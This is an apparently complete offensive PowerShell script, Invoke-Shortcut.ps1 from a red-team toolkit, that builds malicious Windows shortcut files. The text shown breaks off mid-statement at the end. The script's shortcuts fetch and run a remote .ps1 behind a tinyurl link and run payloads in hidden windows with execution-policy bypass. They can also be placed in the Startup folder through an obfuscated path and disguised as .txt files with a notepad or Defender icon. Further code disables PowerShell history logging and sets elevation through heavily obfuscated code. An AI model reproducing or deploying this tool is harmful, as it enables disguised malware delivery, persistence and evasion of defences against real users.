<#
.SYNOPSIS
   Create shortcut file (LNK) that runs appl\script [Mitre - T1027.012]

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: ComObject WScript.Shell
   Optional Dependencies: Iwr, tinyurl
   PS cmdlet Dev version: v2.3.12

.DESCRIPTION
   Create one LNK file (shortcut) on selected location that
   runs our program(.exe) or script(.ps1|.bat) when pressed
   Or download\execute Script.ps1 from https://raw.github

.NOTES
   The LNK file will inherit ApplicationToRun filename

   If invoked -hidden switch shortcut will execute the
   ApplicationToRun in an hidden terminal window state.

   If invoked -RunItAsAdmin switch shortcut spawns [U]AC
   to run elevated (runs with administrator privileges)

   If invoked -remote 'url' switch then cmdlet downloads
   and executes -uri 'https://raw.github/script.ps1' on
   -StartIn 'dir' (function only accepts .PS1 scripts)

.Parameter ApplicationToRun
   The path of appl\script to run (default: $Env:WINDIR\System32\cmd.exe)

.Parameter StartIn
   The Application working directory (default: $Env:TMP)

.Parameter ApplArgs
   The appl\script arguments to be executed? (default: false)

.Parameter LNKPath
   The absolucte path where to create sortcut.lnk (default: $pwd)

.Parameter LNKdescription
   The shortcut description field (default: Pc-Health)

.Parameter LNKIcon
   The LNK file icon (default: $Env:WINDIR\system32\WSCollect.exe)

.Parameter Hidden
   Switch that executes ApplicationToRun in an hidden terminal window

.Parameter RunItAsAdmin
   Switch that makes shortcut ask for administrator privileges [U]AC

.Parameter Remote
   Switch that downloads and executes -uri 'https://raw.github/script.ps1'

.Parameter Uri
   The URL link to be downloaded\executed by the -remote switch

.Parameter Filter
   Switch that allows users to chose LNK icon from pre-selected list

.Parameter LolBin
   Switch that invokes conhost|explorer lolbins to exec script.PS1
   and modifies the LNK file extension from cmd.LNK to cmd.TXT.LNK
   Remark: Only available with -Applicationtorun "C:\Path\script.ps1"

.Parameter NoBanner
   Switch that hiddes this cmdlet ANCII banner

.EXAMPLE
   PS> .\Invoke-Shortcut.ps1 -ApplicationToRun "$Env:TMP\Shell.exe" -LNKPath "C:\Users\pedro\OneDrive\Ambiente de Trabalho"
   Create LNK file (shortcut) on desktop (Ambiente de Trabalho) that runs shell.exe if pressed
   
.EXAMPLE
   PS> .\Invoke-Shortcut.ps1 -ApplicationToRun "$Env:TMP\auxiliary.ps1" -ApplArgs "-action 'query'" -StartIn "$Env:TMP"
   Create LNK file (shortcut) on $pwd directory that runs auxiliary.ps1 (%TMP% working dir) with arguments if pressed

.EXAMPLE
   PS> .\Invoke-Shortcut.ps1 -LNKIcon "C:\Windows\system32\CustomInstallExec.exe" -hidden -RunItAsAdmin
   Create LNK file on $pwd dir, borrow icon from CustomInstallExec.exe, run in an hidden console, with admin privs

.EXAMPLE
   PS> .\Invoke-Shortcut.ps1 -REMOTE -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Get-AVStatus.ps1"
   Create LNK file on $pwd directory that downloads\executes Get-AVStatus.ps1 from -StartIn 'directory'

.OUTPUTS
   [19:18] Mitre - T1027.012
   - Application privs     : 'UserLand'
   - ApplicationToRun      : 'C:\WINDOWS\System32\cmd.exe'

   - Shortcut WindowStyle  : 'normal'
   - Shortcut LNK SHA      : 'F8013FF7B6363593B3F495580354F4BE3D488B315195588DAB8A4F98D3096F1F'
   - Shortcut Location     : 'C:\Users\pedro\OneDrive\Ambiente de Trabalho\work\cmd.lnk'
   - Shortcut Icon File    : 'C:\Program Files (x86)\ASUS\ASUS Smart Gesture\DesktopManager\resource\WindowStoreApp.ico'

.LINK
   https://attack.mitre.org/techniques/T1027/012
   https://superuser.com/questions/1440665/create-windows-shortcut-with-run-as-administrator-option-enabled
   https://learn.microsoft.com/en-us/troubleshoot/windows-client/admin-development/create-desktop-shortcut-with-wsh
#>


## CmdLet Global variable declarations! 
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$LNKIcon="${Env:PROGRAMFILES(x86)}\ASUS\ASUS Smart Gesture\DesktopManager\resource\WindowStoreApp.ico",
   [string]$URI="https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Get-AVStatus.ps1",
   [string]$ApplicationToRun="$Env:WINDIR\System32\cmd.exe",
   [string]$LNKdescription="Pc-Health",
   [string]$StartIn="$Env:TMP",
   [string]$ApplArgs="False",
   [string]$LNKPath="$pwd",
   [switch]$RunItAsAdmin,
   [switch]$NoBanner,
   [switch]$LolBin,
   [switch]$Filter,
   [switch]$Remote,
   [switch]$Hidden
)


$CmdletVersion = "v2.3.12"
$global:LNKIcon = $LNKIcon
## Local variable declarations
$CurrentTime = (Get-Date -Format 'HH:mm')
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "Invoke-Shortcut $CmdletVersion"

$StartBanner = @"
  ____  _   _  ____ _____  _____  ____  __ __  _____ 
 (_ (_ | |_| |/ () \| () )|_   _|/ (__ |  |  ||_   _|
 __)__)|_| |_|\____/|_|\_\  |_|  \____) \___/   |_|$CmdletVersion 
"@;

If(-not($NoBanner.IsPresent))
{
   write-host $StartBanner -ForegroundColor DarkBlue
   write-host "    GitHub: https://github.com/r00t-3xp10it/redpill" -ForegroundColor DarkYellow
}

## Banner
write-host "`n   [" -ForeGroundColor DarkGray -NoNewline
write-host "$CurrentTime" -ForeGroundColor DarkYellow -NoNewline
write-host "] Mitre - T1027.012" -ForeGroundColor DarkGray

If($LNKPath -match '^(:startmeup:)$')
{
   ## Meterpeter C2 v2.10.14.1 function
   $LNKPath = "$Env:APPDATA\M@ic£ro'@'so£ft\£Wi@n£d@o£w£s\S@t£ar£t '@M£e@n£u'\P£r@og£ra@m£s\S@t'£ar£t@u£p" -replace '(@|£|'')',''
}

## Split path to extract last string (filename)
$RawTargetName = $ApplicationToRun.Split('\')[-1] -replace '(.exe|.ps1|.bat)$','' # cmd
$FinalName = "$LNKPath"+"\${RawTargetName}.lnk" -Join '' # C:\Users\pedro\AppData\Roaming\Microsoft\Windows\...\...\...\cmd.lnk

## Make sure LNK to create does not exist already
If(Test-Path -Path "$FinalName")
{
   write-host "   ["  -NoNewline
   write-host "ABORT" -ForegroundColor Red -NoNewline
   write-host "] LNK already exists in '"  -NoNewline
   write-host "$FinalName" -ForegroundColor Red -NoNewline
   write-host "'`n"
   return
}

## Make sure working directory exists
If(-not(Test-Path -Path "$StartIn"))
{
   write-host "   [" -NoNewline
   write-host "NOTFOUND" -ForegroundColor Red -NoNewline
   write-host "] '"  -NoNewline
   write-host "$StartIn" -ForegroundColor Red -NoNewline
   write-host "'`n"
   return
}

function Invoke-BorrowIconFromExe ()
{
   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Borrow icons from applications.exe

   .NOTES
      This function kicks in if inputed -LNKIcon 'path' param
      can't find the icon file OR if user invoke -filter param
   #>

   ## Pre-Selected icons
   $SearchIconsList = @(
      "$Env:WINDIR\system32\WSCollect.exe",
      "$Env:WINDIR\system32\ComputerDefaults.exe",
      "$Env:WINDIR\system32\CustomInstallExec.exe",
      "$Env:PROGRAMFILES\Windows Defender\MpCmdRun.exe",
      "$Env:PROGRAMFILES\PCHealthCheck\PCHealthCheckBroker.exe",
      "$Env:PROGRAMFILES\Windows Defender\Offline\OfflineScannerShell.exe",
      "$Env:PROGRAMFILES\Microsoft Office 15\ClientX64\IntegratedOffice.exe",
      "${Env:PROGRAMFILES(x86)}\Microsoft\Edge\Application\msedge.exe",
      "$Env:PROGRAMFILES\Microsoft Office\root\Office16\excelcnv.exe",
      "$Env:PROGRAMFILES\Microsoft Office\root\Office16\OUTLOOK.exe",
      "$Env:WINDIR\system32\WindowsPowerShell\v1.0\powershell.exe",
      "$Env:PROGRAMFILES\Google\Chrome\Application\Chrome.exe",
      "$Env:LOCALAPPDATA\Programs\Opera GX\opera.exe",
      "$Env:PROGRAMFILES\Mozilla Firefox\Firefox.exe",
      "$Env:PROGRAMFILES\WinRAR\WinRAR.exe",
      "$Env:PROGRAMFILES\ShareX\ShareX.exe",
      "$Env:WINDIR\system32\GamePanel.exe",
      "$Env:WINDIR\system32\mspaint.exe",
      "$Env:WINDIR\system32\wscript.exe",
      "$Env:WINDIR\system32\mmc.exe",
      "$Env:WINDIR\system32\wsl.exe",
      "$Env:WINDIR\system32\cmd.exe",
      "$Env:WINDIR\explorer.exe"
   )

   ## Searching for icons!
   ForEach($Item in $SearchIconsList)
   {
      If(Test-Path -Path "$Item")
      {
         ## Icon found
         write-host "     * " -ForegroundColor Green -NoNewline
         write-host "found: " -NoNewline

         If($Filter.IsPresent)
         {
            ## Let user manually chose icon
            write-host "$Item" -ForegroundColor Green
         }
         Else
         {
            ## Grab the first found application path
            write-host "$Item`n" -ForegroundColor Green
            Start-Sleep -Seconds 2
         }

         ## Borrow icon from application
         $global:LNKIcon = "$Item"

         If($Filter.IsPresent)
         {
            If($Item -match '(explorer.exe)$')
            {
               write-host "     x Last icon of list reached " -ForegroundColor Red -NoNewline
               write-host "'explorer.exe'`n"
               Start-Sleep -Seconds 2
               break
            }

            write-host "     + " -NoNewline -ForegroundColor Red
            write-host "Borrow icon from " -NoNewline
            write-host "$Item" -NoNewline -ForegroundColor Red
            write-host " appl? (Y|N): " -NoNewline

            ## Manual chose icon
            $ChoseMe = Read-Host
            If($ChoseMe -imatch '(y|yes)'){echo "";break}
         }
         Else
         {
           ## break loop after the first found icon
           break
         }
      }
   }

   ## Append icon to LNK file
   $Sh.IconLocation = "$global:LNKIcon, 0"
}

function Invoke-RunItAsAdmin ()
{
   <#
   .SYNOPSIS
      Author: davidmneedham
      Helper - Run LNK shortcut with administrator privileges

   .LINK
      https://superuser.com/questions/1440665/create-windows-shortcut-with-run-as-administrator-option-enabled
   #>

   ## RunItAsAdmin
   $bytes = [System.IO.File]::ReadAllBytes("$FinalName")
   ('*'  |  %{${!'(}  =  +$()}  {  ${'#}  =${!'(}}{${ '}  =++  ${!'(}  }{${'}=++${!'(}}  {  ${@}=  ++  ${!'(}  }  {  ${/}=++${!'(}}{${'/@}  =  ++${!'(}  }  {  ${ }  =++  ${!'(}  }  {  ${ (}=  ++  ${!'(}  }{${``}  =  ++  ${!'(}  }{${* }=++  ${!'(}  }  {${-=)}  =  "["  +  "$(@{}  )"[  ${ (}  ]+"$(@{  })"["${ '}"  +"${* }"  ]+  "$(@{}  )"[  "${'}"+"${'#}"]+  "$?  "[  ${ '}]  +  "]"}  {  ${!'(}=  "".("$(@{}  )  "["${ '}${/}"]+  "$(@{}  )"[  "${ '}${ }"]  +  "$(@{  })"[${'#}  ]  +  "$(  @{})"[${/}  ]+"$?"[${ '}  ]+  "$(  @{  }  )"[${@}  ]  )}  {${!'(}  =  "$(@{  })  "["${ '}${/}"]+  "$(  @{}  )"[  ${/}  ]+  "${!'(}"[  "${'}${ (}"  ]  })  ;"  ${-=)}${@}${ }  +${-=)}${* }${``}+  ${-=)}${ '}${'}${ '}  +${-=)}${ '}${ '}${ }  +${-=)}${ '}${'#}${ '}  +  ${-=)}${ '}${ '}${'/@}  +  ${-=)}${* }${ '}+  ${-=)}${/}${``}  +  ${-=)}${ '}${'}${'#}  +${-=)}${/}${* }  +  ${-=)}${'/@}${@}+  ${-=)}${* }${@}  +${-=)}${@}${'}+${-=)}${ }${ '}+  ${-=)}${@}${'}+  ${-=)}${@}${ }  +${-=)}${* }${``}+${-=)}${ '}${'}${ '}+${-=)}${ '}${ '}${ }  +  ${-=)}${ '}${'#}${ '}  +${-=)}${ '}${ '}${'/@}+${-=)}${* }${ '}+  ${-=)}${/}${``}  +  ${-=)}${ '}${'}${'#}+${-=)}${/}${* }+  ${-=)}${'/@}${@}+  ${-=)}${* }${@}  +${-=)}${@}${'}  +  ${-=)}${/}${'/@}+  ${-=)}${* }${``}  +${-=)}${ '}${ '}${ '}+${-=)}${ '}${ '}${/}+${-=)}${@}${'}+${-=)}${/}${``}+  ${-=)}${ '}${'}${'#}+  ${-=)}${'/@}${'#}  +  ${-=)}${/}${``}|  ${!'(}  "  |  &${!'(}
   (  '(  %'  |%  {  ${* .}=+$(  )  }{${ }=${* .}}{  ${]}  =++  ${* .}  }{  ${*}  =(  ${* .}  =${* .}  +  ${]}  )  }  {${``)(}  =(  ${* .}  =${* .}+${]})}{  ${ ~}=  (${* .}=  ${* .}+${]}  )}{  ${]``}=  (${* .}=  ${* .}+${]}  )  }  {  ${=%#}=(${* .}  =${* .}  +  ${]})}{  ${%}=  (  ${* .}=${* .}  +  ${]})}{  ${)[}=  (${* .}  =  ${* .}+${]}  )  }{${~!+}  =  (  ${* .}  =${* .}  +  ${]}  )  }  {${( '}="["  +  "$(@{  }  )  "[${%}]  +"$(@{})"["${]}${~!+}"  ]  +"$(@{  }  )  "[  "${*}${ }"]  +"$?"[  ${]}]  +"]"  }{  ${* .}="".("$(  @{}  )  "[  "${]}"  +"${ ~}"]  +  "$(@{}  )"[  "${]}"+"${=%#}"]+"$(@{  }  )  "[  ${ }  ]  +"$(  @{})"[${ ~}  ]+  "$?"[  ${]}]  +"$(@{  })"[  ${``)(}  ])}{${* .}  =  "$(  @{})"[  "${]}${ ~}"  ]+"$(@{})"[${ ~}]+  "${* .}"[  "${*}${%}"]  }  )  ;  "  ${( '}${~!+}${]}+  ${( '}${)[}${``)(}+  ${( '}${]}${*}${]}+${( '}${]}${]}${]``}  +${( '}${]}${]}${=%#}  +  ${( '}${]}${ }${]}+${( '}${]}${ }${~!+}+${( '}${ ~}${=%#}+${( '}${%}${``)(}  +  ${( '}${%}${~!+}+  ${( '}${ ~}${=%#}+${( '}${%}${ }  +  ${( '}${]}${ }${]``}+${( '}${]}${ }${)[}  +  ${( '}${]}${ }${]}  +${( '}${~!+}${``)(}+  ${( '}${]``}${)[}+  ${( '}${]``}${)[}  +  ${( '}${)[}${%}+  ${( '}${]}${]}${ ~}  +  ${( '}${]}${ }${]``}  +${( '}${]}${]}${=%#}  +  ${( '}${]}${ }${]}  +${( '}${=%#}${]``}  +  ${( '}${]}${ }${)[}+${( '}${]}${ }${)[}+${( '}${=%#}${=%#}+${( '}${]}${*}${]}+${( '}${]}${]}${=%#}  +  ${( '}${]}${ }${]}+  ${( '}${]}${]}${]``}  +${( '}${ ~}${ }  +  ${( '}${``)(}${ ~}+  ${( '}${``)(}${=%#}  +  ${( '}${%}${ }+${( '}${]}${ }${]``}  +  ${( '}${]}${]}${ }+${( '}${~!+}${%}+${( '}${]}${ }${)[}  +${( '}${%}${)[}  +  ${( '}${~!+}${%}  +${( '}${]}${ }${~!+}+${( '}${]}${ }${]}+${( '}${``)(}${ ~}  +${( '}${ ~}${ ~}  +  ${( '}${``)(}${*}  +${( '}${``)(}${=%#}  +  ${( '}${~!+}${)[}+${( '}${]}${*}${]}+${( '}${]}${]}${=%#}  +  ${( '}${]}${ }${]}+${( '}${]}${]}${]``}+${( '}${ ~}${]}  |  ${* .}"  |.${* .}
}


If($Remote.IsPresent)
{
   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - LNK uri download\execution build function [REMOTE]

   .OUTPUTS
      [19:20] Mitre - T1027.012
      - URI : 'https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Get-AVStatus.ps1'

      - Shortcut WindowStyle  : 'normal'
      - Shortcut Privileges   : 'UserLand'
      - Shortcut Icon File    : 'C:\Program Files\Microsoft Office 15\ClientX64\IntegratedOffice.exe'
      - Shortcut Location     : 'C:\Users\pedro\OneDrive\Ambiente de Trabalho\work\GetAVStatus.lnk'
   #>

   ## Extract script name from url link
   $CmdLetLocalName = $URI.Split('/')[-1]                 # Get-AVStatus.ps1
   $RawFileName = $CmdLetLocalName -replace '(.ps1|-)','' # GetAVStatus
   $FinalName = "${LNKPath}\${RawFileName}.lnk"           # $Env:TMP\GetAVStatus.lnk

   ## -LNKPath limitations checks
   If(Test-Path -Path "$FinalName")
   {
      write-host "   ["  -NoNewline
      write-host "ABORT" -ForegroundColor Red -NoNewline
      write-host "] LNK already exists in '"  -NoNewline
      write-host "$FinalName" -ForegroundColor Red -NoNewline
      write-host "'`n"
      return
   }

   ## -Uri Parameter input limitations checks
   If(($URI -iNotMatch '(.ps1)$') -or ($URI -iNotMatch '(//raw.)'))
   {
      write-host "   [" -NoNewline
      write-host "ERROR" -ForegroundColor Red -NoNewline
      write-host "] this function only accepts [" -NoNewline
      write-host ".ps1" -ForegroundColor Red -NoNewline
      write-host "] or [" -NoNewline
      write-host "//raw.github" -ForegroundColor Red -NoNewline
      write-host "] formats`n"
      return
   }


   ## banner
   write-host "   - " -ForegroundColor Green -NoNewline
   write-host "URI : '" -NoNewline
   write-host "$URI" -ForegroundColor Green -NoNewline
   write-host "'`n"

   ## Invoke-TinyUrl function
   # This function makes our URL smaller ..
   # because LNK execution field has characters limmit 
   $TinyUrlApi = "h£t@tp://ti@nyu£rl.c@om/ap@i-cr£eat£e.ph£p" -replace '(@|£)',''
   $TinyUrlWeb = "@i£w'@'r£ (`"{0}?u@r'l£={1}`" -@f' `"$TinyUrlApi`", `"$URI`")" -replace '(@|£|'')',''
   $Response = $TinyUrlWeb|&('SEX' -replace 'S','I')

   If(-not([string]::IsNullOrEmpty($Response.Content)))
   {
      ## Set Uri to tinyurl
      $URI = $Response.Content
   }

   ## Start building shortcut file [create ComObject]
   $WScriptShell = New-Object -ComObject WScript.Shell
   $Sh = $WScriptShell.CreateShortcut("$FinalName")

   ## Shortcut WindowStyle
   If($Hidden.IsPresent)
   {
      $Delay = "0"
      $HiddenColor = "Red"
      $Sh.WindowStyle = "7"
      $ShortcutWindowStyle = "minimized"
   }
   Else
   {
      $Delay = "3"
      $Sh.WindowStyle = "1"
      $HiddenColor = "Green"
      $ShortcutWindowStyle = "normal"
   }

   $Sh.TargetPath = "$Env:WINDIR\system32\WindowsPowerShell\v1.0\powershell.exe"

   If($ApplArgs -match 'false')
   {
      ## Uri without args
      If($Hidden.IsPresent)
      {
         $Sh.Arguments = "cd $StartIn;iwr -Uri $URI -OutFile $CmdLetLocalName;powershell -exec bypass -W 1 -file $CmdLetLocalName"       
      }
      Else
      {
         $Sh.Arguments = "cd $StartIn;iwr -Uri $URI -OutFile $CmdLetLocalName;powershell -exec bypass -file $CmdLetLocalName;start-sleep -S $Delay"       
      }  
   }
   Else
   {
      ## Uri with arguments
      If($Hidden.IsPresent)
      {
         $Sh.Arguments = "cd $StartIn;iwr -Uri $URI -OutFile $CmdLetLocalName;powershell -exec bypass -W 1 -file $CmdLetLocalName $ApplArgs"       
      }
      Else
      {
         $Sh.Arguments = "cd $StartIn;iwr -Uri $URI -OutFile $CmdLetLocalName;powershell -exec bypass -file $CmdLetLocalName $ApplArgs"       
      }
   }

   If($StartIn -match '\s')
   {
      ## StartIn directory with empty spaces
      $Sh.WorkingDirectory = "`"$StartIn`""
   }
   Else
   {
      ## StartIn dir without empty spaces
      $Sh.WorkingDirectory = "$StartIn"
   }

   ## LNK file description
   $Sh.Description = "Remote URI download\execution"

   ## Append icon to LNK function
   If(-not(Test-Path -Path "$global:LNKIcon"))
   {
      write-host "   x " -foregroundcolor red -nonewline
      write-host "error: " -nonewline
      write-host "inputed icon file not found!" -foregroundcolor red
      Start-Sleep -Seconds 2

      ## Search for icons
      Invoke-BorrowIconFromExe
   }
   Else
   {
      If($Filter.IsPresent)
      {
         ## Search for icons
         Invoke-BorrowIconFromExe      
      }
      Else
      {
         ## Append icon to LNK file
         $Sh.IconLocation = "$global:LNKIcon, 0"
      }
   }

   ## Save LNK
   $Sh.Save()


   ## -RunItAsAdmin configs
   If($RunItAsAdmin.IsPresent)
   {
      ## Run LNK AsAdmin
      Invoke-RunItAsAdmin

      $StatColor = "Red"
      $ApplPrivs = "Administrator"
   }
   Else
   {
      $StatColor = "Green"
      $ApplPrivs = "UserLand"   
   }

   ## Print OnScreen
   Write-Host "   - " -ForegroundColor Green -NoNewline
   Write-Host "Shortcut WindowStyle  : '" -NoNewline
   Write-Host "$ShortcutWindowStyle" -ForegroundColor $HiddenColor -NoNewline
   Write-Host "'"

   Write-Host "   - " -ForegroundColor Green -NoNewline
   Write-Host "Shortcut Privileges   : '" -NoNewline
   Write-Host "$ApplPrivs" -ForegroundColor $StatColor -NoNewline
   Write-Host "'"

   Write-Host "   - " -ForegroundColor Green -NoNewline
   Write-Host "Shortcut Icon File    : '" -NoNewline
   Write-Host "$global:LNKIcon" -ForegroundColor Green -NoNewline   
   Write-Host "'"

   Write-Host "   - " -ForegroundColor Green -NoNewline
   Write-Host "Shortcut Location     : '" -NoNewline
   Write-Host "$FinalName" -ForegroundColor Green -NoNewline
   Write-Host "'`n"

   ## exit cmdlet
   return
}


<#
.SYNOPSIS
   Author: r00t-3xp10it
   Helper - Create shortcut file (LNK) that runs appl\script [LOCAL]

.OUTPUTS
   [19:18] Mitre - T1027.012
   - Application privs     : 'UserLand'
   - ApplicationToRun      : 'C:\WINDOWS\System32\cmd.exe'

   - Shortcut WindowStyle  : 'normal'
   - Shortcut LNK SHA      : 'F8013FF7B6363593B3F495580354F4BE3D488B315195588DAB8A4F98D3096F1F'
   - Shortcut Location     : 'C:\Users\pedro\OneDrive\Ambiente de Trabalho\work\cmd.lnk'
   - Shortcut Icon File    : 'C:\Program Files (x86)\ASUS\ASUS Smart Gesture\DesktopManager\resource\WindowStoreApp.ico'
#>

If($ApplicationToRun -iNotMatch '(.exe|.ps1|.bat)$')
{
   write-host "   ["  -NoNewline
   write-host "ERROR" -ForegroundColor Red -NoNewline
   write-host "] ApplicationToRun only accepts '"  -NoNewline
   write-host ".exe,.ps1,.bat" -ForegroundColor Red -NoNewline
   write-host "' extensions.`n"
   return
}

If(-not(Test-Path -Path "$ApplicationToRun"))
{
   write-host "   ["  -NoNewline
   write-host "NOTFOUND" -ForegroundColor Red -NoNewline
   write-host "] '"  -NoNewline
   write-host "$ApplicationToRun" -ForegroundColor Red -NoNewline
   write-host "'`n"
   return
}

If(-not(Test-Path -Path "$LNKPath"))
{
   write-host "   ["  -NoNewline
   write-host "NOTFOUND" -ForegroundColor Red -NoNewline
   write-host "] '"  -NoNewline
   write-host "$LNKPath" -ForegroundColor Red -NoNewline
   write-host "'`n"
   return
}


## Create ComObject
$WScriptShell = New-Object -ComObject WScript.Shell
$Sh = $WScriptShell.CreateShortcut("$FinalName")

## Execute based on target extension
If(($ApplicationToRun -iMatch '(.ps1)$') -or ($ApplicationToRun -iMatch '(powershell.exe)$'))
{
   $Sh.TargetPath = "$Env:WINDIR\system32\WindowsPowerShell\v1.0\powershell.exe"

   If($ApplicationToRun -iMatch '(powershell.exe)$')
   {
      If(-not($ApplArgs -ieq "False")) ## Powershell execution 'With' args
      {
         If($Hidden.IsPresent)
         {
            ## HIdden windows execution
            $Sh.Arguments = "-exec bypass -W 1 -C `"$ApplArgs`""
         }
         Else
         {
            ## Normal execution
            $Sh.Arguments = "-exec bypass -C `"$ApplArgs`";Start-Sleep -s 3"         
         }         
      }
   }
   Else
   {
      If($ApplArgs -ieq "False")  ## .PS1 execution 'Without' Args
      {
         If($Hidden.IsPresent)
         {
            ## HIdden windows execution
            $Sh.Arguments = "-exec bypass -W 1 -file `"$ApplicationToRun`""

            If($LolBin.IsPresent)
            {
               ## Meterpeter C2 v2.10.14.1 function
               # Invokes conhost|explorer lolbins to exec PS1
               $Sh.TargetPath = "$Env:WINDIR\system32\cmd.exe"
               $Sh.Arguments = "start conhost.exe /k start explorer.exe & powershell -exec bypass -W 1 -file `"$ApplicationToRun`""
            }       
         }
         Else
         {
            ## Normal execution
            $Sh.Arguments = "-exec bypass -file `"$ApplicationToRun`""

            If($LolBin.IsPresent)
            {
               ## Meterpeter C2 v2.10.14.1 function
               # Invokes conhost|explorer lolbins to exec PS1
               $Sh.TargetPath = "$Env:WINDIR\system32\cmd.exe"
               $Sh.Arguments = "start conhost.exe /k start explorer.exe & powershell -exec bypass -file `"$ApplicationToRun`""
            }  
         }
      } 
      Else  ## .PS1 execution 'WITH' args
      {
         If($Hidden.IsPresent)
         {
            ## HIdden windows execution
            $Sh.Arguments = "-exec bypass -W 1 -file $ApplicationToRun $ApplArgs"

            If($LolBin.IsPresent)
            {
               ## Meterpeter C2 v2.10.14.1 function
               # Invokes conhost|explorer lolbins to exec PS1
               $Sh.TargetPath = "$Env:WINDIR\system32\cmd.exe"
               $Sh.Arguments = "start conhost.exe /k start explorer.exe & powershell -exec bypass -W 1 -file $ApplicationToRun $ApplArgs"
            }  
         }
         Else
         {
            ## Normal execution
            $Sh.Arguments = "-exec bypass -file $ApplicationToRun $ApplArgs"

            If($LolBin.IsPresent)
            {
               ## Meterpeter C2 v2.10.14.1 function
               # Invokes conhost|explorer lolbins to exec PS1
               $Sh.TargetPath = "$Env:WINDIR\system32\cmd.exe"
               $Sh.Arguments = "start conhost.exe /k start explorer.exe & powershell -exec bypass -file $ApplicationToRun $ApplArgs"
            }  
         }    
      }
   }
}
ElseIf($ApplicationToRun -iMatch '(.bat|.exe)$')
{
   $Sh.TargetPath = "cmd.exe"

   If($ApplArgs -ieq "False") ## WITHOUT ARGS
   {
      If($Hidden.IsPresent)
      {
         ## Hidden terminal windows execution
         # This will create a separate process (without a window), and not block parent window
         $Sh.Arguments = "start /b cmd /R `"$ApplicationToRun`""
      }
      Else
      {
         ## Normal execution
         $Sh.Arguments = "/R `"$ApplicationToRun`""        
      }
   }
   Else ## WITH ARGS
   {
      ## With Arguments
      $CheckIos = $ApplicationToRun.Split('\')[-1] # cmd.exe
      If($CheckIos -match '(cmd.exe)$')
      {
         $Sh.Arguments = "/R $ApplArgs"
         If($Hidden.IsPresent)
         {
            ## Hidden terminal windows execution
            # This will create a separate process (without a window), and not block parent window
            $Sh.Arguments = "start /b cmd /R $ApplArgs" 
         }
      }
      Else
      {
         $Sh.Arguments = "/R `"$ApplicationToRun $ApplArgs`""
         If($Hidden.IsPresent)
         {
            ## Hidden terminal windows execution
            # This will create a separate process (without a window), and not block parent window
            $Sh.Arguments = "start /b cmd /R `"$ApplicationToRun $ApplArgs`"" 
         }
      }
   }
}
 
If($Hidden.IsPresent)
{
   $StyleHidden = "7"
   $HiddenColor = "Red"
   $ShortcutWindowStyle = "minimized"
}
Else
{
   $StyleHidden = "1"   
   $HiddenColor = "Green"
   $ShortcutWindowStyle = "normal"
}

$Sh.WindowStyle = "$StyleHidden"

If($StartIn -match '\s')
{
   $Sh.WorkingDirectory = "`"$StartIn`""
}
Else
{
   $Sh.WorkingDirectory = "$StartIn" 
}

$Sh.Description = "$LNKdescription"


## Make sure icon exists!
If(-not(Test-Path -Path "$global:LNKIcon"))
{
   write-host "   x " -foregroundcolor red -nonewline
   write-host "error: " -nonewline
   write-host "inputed icon file not found!" -foregroundcolor red
   Start-Sleep -Seconds 2

   ## Search for icons
   Invoke-BorrowIconFromExe
}
Else
{
   If($Filter.IsPresent)
   {
      ## Search for icons
      Invoke-BorrowIconFromExe   
   }
   Else
   {
      ## Append icon to LNK file
      $Sh.IconLocation = "$global:LNKIcon, 0"
   }
}

If($LolBin.IsPresent)
{
   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Spoof the file extension to .txt.lnk

   .NOTES
      Switch that invokes conhost|explorer lolbins to exec script.PS1
      and modifies the LNK file extension from cmd.LNK to cmd.TXT.LNK
   #>

   $Sh.IconLocation = "$Env:WINDIR\system32\notepad.exe, 0"
   $Sh.Description = "Type: Text Document"
}

## Save Icon
$Sh.Save()


If($RunItAsAdmin.IsPresent)
{
   ## RunItAsAdmin
   Invoke-RunItAsAdmin

   $StatColor = "Red"
   $ApplPrivs = "Administrator"
}
Else
{
   $StatColor = "Green"
   $ApplPrivs = "UserLand"
}

Start-Sleep -Milliseconds 300
## Check if LNK was successfuly created
If(-not(Test-Path -Path "$FinalName"))
{
   write-host "   x " -ForegroundColor Red -NoNewline
   write-host "error: " -NoNewline
   write-host "fail to create LNK shortcut file`n" -ForegroundColor Red
   return
}

If($LolBin.IsPresent)
{
   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Spoof the file extension to .txt.lnk

   .NOTES
      Switch that invokes conhost|explorer lolbins to exec script.PS1
      and modifies the LNK file extension from cmd.LNK to cmd.TXT.LNK
   #>

   $global:LNKIcon = "$Env:WINDIR\system32\notepad.exe"
   $NewCharName = $FinalName -replace '.lnk','.txt.lnk'
   Move-Item -Path "$FinalName" -Destination "$NewCharName" -Force
   $FinalName = $NewCharName
}

## Banner
$SHA1 = (Get-FileHash "$FinalName").Hash
Write-Host "   - " -ForegroundColor Green -NoNewline
Write-Host "Application privs     : '" -NoNewline
Write-Host "$ApplPrivs" -ForegroundColor $StatColor -NoNewline
Write-Host "'"

Write-Host "   - " -ForegroundColor Green -NoNewline
Write-Host "ApplicationToRun      : '" -NoNewline
Write-Host "$ApplicationToRun" -ForegroundColor Green -NoNewline
Write-Host "'"

If($ApplArgs -ne "False")
{
   Write-Host "     * " -ForegroundColor Red -NoNewline
   Write-Host "Application Args    : '" -NoNewline
   Write-Host "$ApplArgs" -ForegroundColor Red -NoNewline
   Write-Host "'"
}

If($LolBin.IsPresent)
{
   Write-Host "     * " -ForegroundColor Red -NoNewline
   Write-Host "LOLBIN Execution    : '" -NoNewline
   Write-Host "cmd start conhost.exe /k start explorer.exe &" -ForegroundColor Red -NoNewline
   Write-Host "'"

   Write-Host "     * " -ForegroundColor Red -NoNewline
   Write-Host "SPOOF Extension     : from '" -NoNewline
   Write-Host "${RawTargetName}.lnk" -ForegroundColor Red -NoNewline
   Write-Host "' -> '" -NoNewline
   Write-Host "${RawTargetName}.txt.lnk" -ForegroundColor Red -NoNewline
   Write-Host "'"
}

write-host ""
Start-Sleep -Seconds 1
Write-Host "   - " -ForegroundColor Green -NoNewline
